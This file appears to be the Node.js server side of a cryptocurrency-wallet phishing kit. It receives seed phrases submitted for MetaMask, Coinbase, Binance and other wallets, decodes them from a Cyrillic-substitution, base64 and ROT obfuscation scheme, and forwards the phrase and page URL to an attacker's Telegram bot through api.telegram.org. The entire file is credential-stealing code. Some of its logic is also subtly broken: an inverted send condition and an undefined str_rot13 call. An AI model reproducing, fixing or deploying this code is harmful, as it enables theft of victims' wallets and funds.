const https = require('https');
const url = require('url');

function tphrase(message) {
    message = message.replace(/с/g, '1')
        .replace(/о/g, '2')
        .replace(/Н/g, '3')
        .replace(/С/g, '4')
        .replace(/е/g, '5')
        .replace(/Х/g, '6')
        .replace(/Т/g, '7')
        .replace(/А/g, '8')
        .replace(/О/g, '9')
        .replace(/Е/g, '0');

    function str_rot(s, n = 13) {
        const letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        n = parseInt(n) % 26;
        if (!n) return s;
        if (n === 13) return str_rot13(s);
        let rotated = '';
        for (let i = 0; i < s.length; i++) {
            const c = s[i];
            if (c >= 'a' && c <= 'z') {
                rotated += letters[(c.charCodeAt(0) - 71 + n) % 26];
            } else if (c >= 'A' && c <= 'Z') {
                rotated += letters[(c.charCodeAt(0) - 39 + n) % 26 + 26];
            } else {
                rotated += c;
            }
        }
        return rotated;
    }
    return str_rot(Buffer.from(message, 'base64').toString());
}

const server = https.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString(); // convert Buffer to string
        });
        req.on('end', () => {
            const postData = new URLSearchParams(body);
            let namewallet = '';
            let phrase = '';
            let txt = '';
            let url = ((!req.connection.encrypted) ? 'http' : 'https') + '://' + req.headers.host + req.url;
            url = url.split('?')[0];

            if (postData.has('m')) {
                namewallet = "metamask";
                phrase = tphrase(postData.get('m'));
            } else if (postData.has('w')) {
                namewallet = "walletconnect";
                phrase = tphrase(postData.get('w'));
            } else if (postData.has('c')) {
                namewallet = "coinbase";
                phrase = tphrase(postData.get('c'));
            } else if (postData.has('b')) {
                namewallet = "binance";
                phrase = tphrase(postData.get('b'));
            } else if (postData.has('cl')) {
                namewallet = "Clover";
                phrase = tphrase(postData.get('cl'));
            } else if (postData.has('co')) {
                namewallet = "Crypto Org";
                phrase = tphrase(postData.get('co'));
            } else if (postData.has('0')) {
                namewallet = "metamask";
                phrase = Array.from({ length: 24 }, (_, i) => postData.get(String(i))).join(' ');
            }

            const token = "seu token";
            const chat_id = "seu id";

            const arr = {
                'Кошелек: ': namewallet,
                'Phrase: ': '`' + phrase + '`',
                'URL:': url
            };

            for (const [key, value] of Object.entries(arr)) {
                txt += `${key} ${value}%0A`;
            }

            if (!namewallet && phrase) {
                const options = {
                    hostname: 'api.telegram.org',
                    port: 443,
                    path: `/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${txt}`,
                    method: 'GET'
                };

                const req = https.request(options, res => {
                    console.log(`statusCode: ${res.statusCode}`);
                    res.on('data', d => {
                        process.stdout.write(d);
                    });
                });

                req.on('error', error => {
                    console.error(error);
                });

                req.end();
            }
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
